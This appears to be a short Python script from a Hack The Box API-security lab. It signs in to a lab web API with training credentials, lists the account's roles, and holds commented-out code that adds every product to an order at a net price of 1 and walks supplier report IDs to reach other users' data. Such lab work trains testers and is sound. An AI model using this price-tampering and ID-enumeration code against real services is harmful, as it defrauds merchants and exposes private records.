
import requests

rhost = "94.237.59.199:49866"

#authenticate

headers = {
    "accept": "application/json"
}
data = {
    "Email":"htbpentester7@hackthebox.com",
    "Password":"HTBPentester7"
}

def authenticateAndGetRoles():
    url = 'http://' + rhost + '/api/v1/authentication/customers/sign-in'                # customers or suppliers
    response = requests.post(url=url, json=data, headers=headers)
    jwt = "Bearer " + response.json()['jwt']
    headers.update({"Authorization": jwt})
    print(jwt)
    # what access do I have
    url = 'http://' + rhost + '/api/v1/roles/current-user'
    response = requests.get(url, headers=headers)
    print(response.json())


def Execute():
    print("running")
'''
    # create new order
    url = 'http://' + rhost + '/api/v1/customers/orders'
    payload = {
        "Date": "2024-09-09"
        }
    response = requests.post(url=url, json=payload, headers=headers)
    data = response.json()
    orderid = data["id"]
    # get all products
    url = 'http://' + rhost + '/api/v1/products'
    response = requests.get(url, headers=headers)
    data = response.json()
    print(data)
    for d in data["products"]:
        payload = {
            "OrderID": orderid,
            "OrderItems": [
                {
                "ProductID": d["id"],
                "Quantity": 1,
                "NetSum": 1
                }
            ]
        }
    # add a fake order entry with netsum of 1
    url = 'http://' + rhost + '/api/v1/customers/orders/items'
    print(payload)
    response = requests.post(url=url, json=payload, headers=headers)
    data = response.json()
    print(data)
'''


    #url = 'http://' + rhost + '/api/v1/customers/orders/' + orderid
    #print(url)
    #response = requests.get(url, headers=headers)
    #data = response.json()
    #print(data)



    #response = requests.get(url, headers=headers)
    #data = response.json()
    #print(data)


#   {'roles': ['CustomerOrders_GetByID', 'CustomerOrders_Create', 'CustomerOrderItems_Get', 'CustomerOrderItems_Create']}
authenticateAndGetRoles()

Execute()





#for i in range(20):
    #url = 'http://' + rhost + '/api/v1/suppliers/quarterly-reports/' + str(i)
    #response = requests.get(url, headers=headers)
    #print(response.json())


